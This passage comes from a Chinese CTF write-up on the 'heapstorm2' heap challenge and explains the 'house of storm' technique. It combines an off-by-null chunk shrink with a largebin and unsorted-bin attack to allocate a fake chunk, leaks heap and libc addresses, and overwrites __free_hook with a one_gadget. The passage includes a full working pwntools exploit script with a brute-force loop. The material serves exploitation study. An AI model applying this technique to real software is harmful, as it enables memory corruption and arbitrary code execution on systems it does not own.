这里free完后又初始化为随机数，相当于清空了指针和size，没有漏洞
4、View
    int __fastcall View(chunk *mmap)
    {
      __int64 size; // rbx
      __int64 ptr; // rax
      signed int idx; // [rsp+1Ch] [rbp-14h]
    ​
      if ( (mmap[1].size ^ mmap[1].ptr) != 0x13377331 )//都是随机数，所以异或后不可能是这个值
        return puts("Permission denied");
      printf("Index: ");
      idx = get_long();
      if ( idx  15 || !xorsize(mmap, mmap[idx + 2].size) )
        return puts("Invalid Index");
      printf("Chunk[%d]: ", idx);
      size = xorsize(mmap, mmap[idx + 2].size);
      ptr = xorchunk(mmap, mmap[idx + 2LL].ptr);
      write_n(ptr, size);
      return puts(byte_180A);
    }
这里明显是不能使用show函数，得改了才能使用这个函数进行泄露。
好了，程序分析完了，流程也清楚了，下面就是怎么利用offbynull去打题了，大概的思路如下：
1、利用offbynull，shrink the chunk（无法extend，因为presize被覆盖了字符，不能控制），造成对used态的堆块的修改
2、伪造largebin的bk_nextsize和bk指针，利用堆块插入时unlink，实现任意地址写堆地址，从而伪造出fake_chunk的size，fake_chunk肯定是mmap上面的地址啦
3、改写unsorted bin中堆块的bk指针，指向fake_chunk，就能看size申请出fake_chunk
4、申请出fake_chunk，就能改view函数的那个异或关卡，实现调用view函数泄露地址
5、通过改ptr位置为free_hook，然后update时就会改free_hook为onegadget，从而getshell
具体看exp：
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./heapstorm2')
    if local:
        p = process('./heapstorm2')
        libc = elf.libc
    else:
        p = remote('192.168.100.20',50001)
        libc = ELF('./libc-2.18.so')
    #onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    ​
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(p,"b *{}".format(hex(addr)))
    ​
    def bk(addr):
        gdb.attach(p,"b *"+str(hex(addr)))
    ​
    def malloc(size):
        ru("Command: ")
        sl('1')
        ru("Size: ")
        sl(str(size))
    def free(index):
        ru("Command: ")
        sl('3')
        ru("Index: ")
        sl(str(index))
    def update(index,size,content):
        ru("Command: ")
        sl('2')
        ru("Index: ")
        sl(str(index))
        ru("Size: ")
        sl(str(size))
        ru("Content: ")
        sl(content)
    def show(index):
        ru("Command: ")
        sl('4')
        ru("Index: ")
        sl(str(index))
    ​
    mmap_addr = 0x13370800
    ​
    def pwn():
        malloc(0x18)#0
        malloc(0x520)#1
        malloc(0x18)#2
        malloc(0x18)#3
        malloc(0x520)#4
        malloc(0x18)#5
        malloc(0x18)#6
        py = ''
        py += 'a'*0x4f0
        py += p64(0x500) + p64(0x30)
        update(1,len(py),py)
        # debug(0)
        free(1)
        update(0,0x18-0xc,(0x18-0xc)*'a')
    ​
        malloc(0x60)
        malloc(0x480)#7
        # debug(0)
        free(1)
        free(2)
        malloc(0x540)#1
        py = ''
        py += '\x00'*0x60
        py += p64(0) + p64(0x491)
        py += '\x00'*0x480
        py += p64(0x490) + p64(0x51)
        update(1,len(py),py)
        #fake_chunk1 #7
        py = ''
        py += 'a'*0x4f0
        py += p64(0x500) + p64(0x30)
        update(4,len(py),py)
        free(4)
        update(3,0x18-0xc,(0x18-0xc)*'b')
        malloc(0x70)
        malloc(0x470)#4
        # #fake_chunk2 #4
        free(2)
        free(5)
        malloc(0x540)#2
        py = ''
        py += '\x00'*0x70
        py += p64(0) + p64(0x481)
        py += '\x00'*0x470
        py += p64(0x480) + p64(0x51)
        update(2,len(py),py)
        free(4)
        malloc(0x580)
        free(7)
        py = ''
        py += '\x00'*0x60
        py += p64(0) + p64(0x491)
        py += p64(0) + p64(mmap_addr-0x10)
        py += '\x00'*0x470
        py += p64(0x490) + p64(0x50)
        update(1,len(py),py)
    ​
        py = ''
        py += '\x00'*0x70
        py += p64(0) + p64(0x481)
        py += p64(0) + p64(mmap_addr-0x10+8)
        py += p64(0) + p64(mmap_addr-0x10-0x18-5)
        py += '\x00'*0x450
        py += p64(0x480) + p64(0x50)
        update(2,len(py),py) 
    ​
        malloc(0x48)#5
    ​
        py = ''
        py += p64(0) + p64(0)
        py += p64(0x13377331) + p64(0)
        py += p64(0x13370820)
        update(5,len(py),py)
        py = ''
        py += p64(0x13370820) + p64(8)
        py += p64(0x133707f0+3) + p64(8)
        update(0,len(py),py)
        show(1)
    ​
        ru("Chunk[1]: ")
        heap = u64(rc(8)) - 0x90
        print "heap--->"  + hex(heap)
        # debug(0)
        py = ''
        py += p64(0x13370820) + p64(8)
        py += p64(heap+0xa0) + p64(8)
        update(0,len(py),py)
        show(1)
        ru("Chunk[1]: ")
        libc_base = u64(rc(8)) - 0x3c4b78
        print "libc_base--->"  + hex(libc_base)
        free_hook = libc_base + libc.sym["__free_hook"]
        onegadget = libc_base + 0xf02a4
        py = ''
        py += p64(0x13370820) + p64(8)
        py += p64(free_hook) + p64(8)
        update(0,len(py),py)
        update(1,8,p64(onegadget))
        free(6)
    i = 0
    while 1:
        i += 1
        print i
        try:
            pwn()
        except Exception as e:
            p.close()
            if local:
                p = process('./heapstorm2')
                libc = elf.libc
            else:
                p = remote('192.168.100.20',50001)
                libc = ELF('./libc-2.18.so')
            continue
        else:
            sl("ls")
            break
    ​
    p.interactive()
下面就解释下，exp中的每一步是在实现什么东西：
首先得有2个大堆块，作为largebin的堆块，因为presize无法控制，所以我们就shrink the
chunk，先缩小堆块，然后再unlink合并，这里free时的nextsize要设置好。
    malloc(0x18)#0
    malloc(0x520)#1
    malloc(0x18)#2
    malloc(0x18)#3
    malloc(0x520)#4
    malloc(0x18)#5
    malloc(0x18)#6
    py = ''
    py += 'a'*0x4f0
    py += p64(0x500) + p64(0x30)
    update(1,len(py),py)
    # debug(0)
    free(1)
    update(0,0x18-0xc,(0x18-0xc)*'a')
    ​
    malloc(0x60)
    malloc(0x480)#7
    #large_chunk1 #7
    ​
    free(1)
    free(2)
    malloc(0x540)#1
    py = ''
    py += '\x00'*0x60
    py += p64(0) + p64(0x491)
    py += '\x00'*0x480
    py += p64(0x490) + p64(0x51)
    update(1,len(py),py)
这样得到的0x540的1号堆块就能往下写从而修改free状态的7号块的fd和bk那些指针，第二个largebin一样的原理，但是要注意，这两个构造的largebin大小要不一样。
    py = ''
    py += 'a'*0x4f0
    py += p64(0x500) + p64(0x30)
    update(4,len(py),py)
    free(4)
    update(3,0x18-0xc,(0x18-0xc)*'b')
    malloc(0x70)
    malloc(0x470)#4
    # #large_chunk2 #4
    free(2)
    free(5)
    malloc(0x540)#2
    py = ''
    py += '\x00'*0x70
    py += p64(0) + p64(0x481)
    py += '\x00'*0x470
    py += p64(0x480) + p64(0x51)
    update(2,len(py),py)
部署好后，应该是这样的堆块布局：得到0x491和0x481的largebin
    free(4)
    malloc(0x580)
    free(7)
    4号放largebin，7号放unsorted bin
    py = ''
    py += '\x00'*0x60
    py += p64(0) + p64(0x491)
    py += p64(0) + p64(mmap_addr-0x10)
    py += '\x00'*0x470
    py += p64(0x490) + p64(0x50)
    update(1,len(py),py)
这里是改unsortedbin的bk指针为我们伪造的fake_chunk的地址
    py = ''
    py += '\x00'*0x70
    py += p64(0) + p64(0x481)
    py += p64(0) + p64(mmap_addr-0x10+8)
    py += p64(0) + p64(mmap_addr-0x10-0x18-5)
    py += '\x00'*0x450
    py += p64(0x480) + p64(0x50)
    update(2,len(py),py)
改largebin的bk和bk_nextsize指针，当新的堆块插进largebin时，会在(mmap_addr-0x10+8）的fd处写入堆地址，同样在（mmap_addr-0x10-0x18-5）的fd_nextsize写入堆地址（成功伪造出fake_chunk的size头），实现largebin的attack。
    malloc(0x48)
这一步是触发largebin的attack，先遍历unsotedbin，发现有我们释放的largebin大小的堆块，但是因为不是last
remainer，所以无法切割给用户，就会插入到largebin，触发攻击，在（mmap_addr-0x10-0x18-5）的fd_nextsize写入堆地址，由于剩下我们的bk所指的fake_chunk在main_arena上，此时fake_chunk由于largebin的攻击，已经有size头了，当我们malloc(0x48)时，就会把fake_chunk申请出来，接着就可以开始操作了，但是有时候会失败，所以我写了个小型爆破。
可以看到fake_chunk的头是0x56大小
这里0x13370800正是放随机数的地址，我们写成0，这样每次异或得到都是本身，同时改0x13370810和0x13370818为0x13377331和0，就可以使用view函数打印地址了，代码如下：
    py = ''
    py += p64(0) + p64(0)
    py += p64(0x13377331) + p64(0)
    py += p64(0x13370820)#首堆块的地址，方便下一次从自身开始update写入
    update(5,len(py),py)
    py = ''
    py += p64(0x13370820) + p64(8)
    py += p64(0x133707f0+3) + p64(8)#泄露堆地址
    update(0,len(py),py)
    ru("Chunk[1]: ")
    heap = u64(rc(8)) - 0x90
    print "heap--->"  + hex(heap)
泄露libc原理一样：
    py = ''
    py += p64(0x13370820) + p64(8)
    py += p64(heap+0xa0) + p64(8)
    update(0,len(py),py)
    show(1)
    ru("Chunk[1]: ")
    libc_base = u64(rc(8)) - 0x3c4b78
    print "libc_base--->"  + hex(libc_base)
    free_hook = libc_base + libc.sym["__free_hook"]
    onegadget = libc_base + 0xf02a4
最后改free_hook为onegadget，free实现getshell：
    py = ''
    py += p64(0x13370820) + p64(8)
    py += p64(free_hook) + p64(8)
    update(0,len(py),py)
    update(1,8,p64(onegadget))
    free(6)
总结：
house of storm就是结合largebin的插入实现任意地址写堆地址和unsorted
bin的非lastremainer不切割的一种攻击方式，能实现申请出一个不可控的地址的堆块，从而修改数据，比较巧妙，也挺有趣，关键指针布局好，堆块就能出来，搞清楚了堆块布局就可以实现。